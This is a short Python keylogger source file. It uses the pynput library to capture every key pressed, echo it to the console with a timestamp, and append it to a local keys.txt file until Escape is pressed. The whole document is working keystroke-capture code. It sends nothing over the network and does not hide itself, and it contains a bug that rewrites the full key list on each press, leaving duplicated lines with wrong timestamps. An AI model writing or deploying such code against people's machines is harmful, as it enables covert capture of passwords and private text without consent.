import datetime
from pynput.keyboard import Key, Listener 


keys = []
def on_press(key):
    global keys
    keys.append(key)
    date = datetime.datetime.now()
    print(f"{date}  {key} pressed.")
    write_file(keys)



def write_file(keys):
    date = datetime.datetime.now()
    with open("keys.txt", "a") as f:
        for key in keys:
            f.write(f'{date}  {str(key)} pressed.')
            f.write("\n")

def on_release(key):
    if key==Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()   